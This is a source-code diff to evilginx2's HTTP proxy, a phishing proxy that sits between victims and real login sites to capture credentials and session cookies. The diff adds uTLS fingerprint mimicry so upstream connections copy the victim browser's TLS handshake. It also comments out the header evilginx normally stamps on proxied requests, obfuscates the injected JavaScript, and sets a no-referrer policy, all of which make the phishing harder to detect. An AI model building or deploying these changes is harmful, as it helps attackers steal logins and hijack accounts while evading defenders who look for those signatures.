@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -32,13 +33,16 @@ import (
 	"sync"
 	"time"
 
+	"golang.org/x/net/http2"
 	"golang.org/x/net/proxy"
 
-	"github.com/elazarl/goproxy"
+	"github.com/afsin-asf/goproxy-utls"
 	"github.com/fatih/color"
-	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
+	utls "github.com/refraction-networking/utls"
+	"github.com/tdewolff/minify/v2"
+	"github.com/tdewolff/minify/v2/js"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -49,9 +53,9 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-const (
-	HOME_DIR = ".evilginx"
-)
+// const (
+// 	HOME_DIR = ".evilginx"
+// )
 
 const (
 	httpReadTimeout  = 45 * time.Second
@@ -106,6 +110,97 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+// http2CompatibleUTLSConn wraps utls.UConn to properly report HTTP/2 negotiation status
+type http2CompatibleUTLSConn struct {
+	net.Conn
+	uConn *utls.UConn
+}
+
+func (c *http2CompatibleUTLSConn) ConnectionState() tls.ConnectionState {
+	// Convert utls ConnectionState to standard tls ConnectionState
+	uState := c.uConn.ConnectionState()
+	return tls.ConnectionState{
+		Version:                    uState.Version,
+		HandshakeComplete:          uState.HandshakeComplete,
+		DidResume:                  uState.DidResume,
+		CipherSuite:                uState.CipherSuite,
+		NegotiatedProtocol:         uState.NegotiatedProtocol,
+		NegotiatedProtocolIsMutual: uState.NegotiatedProtocolIsMutual,
+		ServerName:                 uState.ServerName,
+		PeerCertificates:           uState.PeerCertificates,
+		VerifiedChains:             uState.VerifiedChains,
+		OCSPResponse:               uState.OCSPResponse,
+		TLSUnique:                  uState.TLSUnique,
+	}
+}
+
+func (c *http2CompatibleUTLSConn) Read(b []byte) (int, error) {
+	return c.uConn.Read(b)
+}
+
+func (c *http2CompatibleUTLSConn) Write(b []byte) (int, error) {
+	return c.uConn.Write(b)
+}
+
+func (c *http2CompatibleUTLSConn) Close() error {
+	return c.uConn.Close()
+}
+
+// createCustomUTLSTransport creates an HTTP/2 transport that uses uTLS with the captured ClientHelloSpec
+// This ensures upstream connections use the client's TLS fingerprint instead of default Chrome
+func createCustomUTLSTransport(spec *utls.ClientHelloSpec) http.RoundTripper {
+	dialTLSContext := func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
+		// Dial raw TCP connection
+		d := &net.Dialer{}
+		rawConn, err := d.DialContext(ctx, network, addr)
+		if err != nil {
+			return nil, err
+		}
+
+		// Extract host from addr for ServerName in TLS config
+		host, _, _ := net.SplitHostPort(addr)
+		if host == "" {
+			host = addr
+		}
+
+		// Create TLS config with HTTP/2 support
+		tlsConfig := &utls.Config{
+			ServerName:         host,
+			InsecureSkipVerify: true,
+			NextProtos:         []string{"h2", "http/1.1"},
+		}
+
+		// Create uTLS connection with the captured ClientHelloSpec
+		uConn := utls.UClient(rawConn, tlsConfig, utls.HelloCustom)
+
+		// Apply the captured ClientHelloSpec
+		if err := uConn.ApplyPreset(spec); err != nil {
+			// If ApplyPreset fails, fall back to Chrome_Auto
+			log.Warning("ApplyPreset failed: %v, using Chrome_Auto", err)
+			rawConn.Close()
+			rawConn2, err2 := d.DialContext(ctx, network, addr)
+			if err2 != nil {
+				return nil, err2
+			}
+			uConn = utls.UClient(rawConn2, tlsConfig, utls.HelloChrome_Auto)
+		}
+
+		// Perform TLS handshake
+		if err := uConn.HandshakeContext(ctx); err != nil {
+			uConn.Close()
+			return nil, err
+		}
+
+		// Wrap in compatibility wrapper to properly report HTTP/2 negotiation
+		return &http2CompatibleUTLSConn{uConn: uConn}, nil
+	}
+
+	// Use HTTP/2 Transport for proper protocol handling
+	return &http2.Transport{
+		DialTLSContext: dialTLSContext,
+	}
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -144,7 +239,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
-	p.Proxy.Verbose = false
+	// goproxy-utls handles TLS fingerprint mimicking internally via custom transport
+	// Enable verbose logging for debugging TLS fingerprint capture
+	p.Proxy.Verbose = true
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
 		req.URL.Scheme = "https"
@@ -154,6 +251,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
+	// ClientHelloSpec handling is now done in vendor/goproxy-utls package
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
@@ -163,6 +261,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				PhishletName: "",
 				Index:        -1,
 			}
+
+			// DEBUG: Check if ClientHelloSpec is available
+			if ctx.ClientHelloSpec != nil {
+				log.Debug("DoFunc: ClientHelloSpec captured - will use for upstream TLS")
+				// Override RoundTripper to use ClientHelloSpec for upstream TLS
+				ctx.RoundTripper = goproxy.RoundTripperFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
+					// Create custom TLS transport with ClientHelloSpec
+					tr := createCustomUTLSTransport(ctx.ClientHelloSpec)
+					return tr.RoundTrip(req)
+				})
+			} else {
+				log.Debug("DoFunc: ClientHelloSpec is NIL - no fingerprint available")
+			}
+
+			if req.ProtoMajor == 2 {
+				// HTTP/2'de Host header yerine :authority kullanılır
+				// Go bunu otomatik yapar, ama connection-specific header'ları temizle
+				req.Header.Del("Connection")
+				req.Header.Del("Keep-Alive")
+				req.Header.Del("Transfer-Encoding") // chunked HTTP/2'de yok
+				req.Header.Del("Upgrade")
+			}
+
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
@@ -466,7 +587,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +777,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -884,7 +1005,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
-
+			resp.Header.Set("Referrer-Policy", "no-referrer")
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
@@ -1331,7 +1452,16 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		minifier := minify.New() // "github.com/tdewolff/minify/js"
+		minifier.AddFunc("text/javascript", js.Minify)
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		if err != nil {
+			// Handle error - Obfuscation failed
+			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+		}
+		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
+		//d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
@@ -1528,8 +1658,8 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 	return body
 }
 
-func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*utls.Config, error) {
+	return func(host string, ctx *goproxy.ProxyCtx) (c *utls.Config, err error) {
 		parts := strings.SplitN(host, ":", 2)
 		hostname := parts[0]
 		port := 443
@@ -1537,34 +1667,32 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			port, _ = strconv.Atoi(parts[1])
 		}
 
-		tls_cfg := &tls.Config{}
-		if !p.developer {
+		log.Debug("TLSConfigFromCA: generating certificate for %s", hostname)
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
-
-			return tls_cfg, nil
+		// Check if ClientHello fingerprint was captured from incoming client
+		if ctx != nil && ctx.ClientHelloSpec != nil {
+			log.Debug("TLSConfigFromCA: ClientHelloSpec captured, will use browser fingerprint")
 		} else {
-			var ok bool
-			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
-			}
-
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-			if err != nil {
-				log.Error("http_proxy: %s", err)
-				return nil, err
-			}
-			return &tls.Config{
-				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
-			}, nil
+			log.Debug("TLSConfigFromCA: no ClientHelloSpec available, using default TLS")
 		}
+
+		// Get local self-signed certificate
+		utlsCert, err := p.crt_db.getSelfSignedCertificate(hostname, "", port)
+		if err != nil {
+			log.Error("http_proxy: failed to get certificate for %s: %s", hostname, err)
+			return nil, err
+		}
+
+		log.Debug("TLSConfigFromCA: certificate generated, chain length=%d", len(utlsCert.Certificate))
+
+		// Create minimal TLS config - let goproxy-utls handle the rest
+		tls_cfg := &utls.Config{
+			Certificates: []utls.Certificate{*utlsCert},
+		}
+
+		log.Debug("TLSConfigFromCA: TLS config created for %s", hostname)
+
+		return tls_cfg, nil
 	}
 }
 
@@ -1788,9 +1916,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -1982,8 +2110,10 @@ func getContentType(path string, data []byte) string {
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
+	// Generate SHA256 hash (produces 64 hex chars for full hash)
 	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
-	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = s_hash[:4] + "-" + s_hash[4:]
-	return s_hash
+	// Convert full hash to hex string
+	hashStr := fmt.Sprintf("%x", hash[:])
+	// Return cookie name as XXXX-XXXX (first 8 hex chars with dash separator)
+	return hashStr[:4] + "-" + hashStr[4:8]
 }
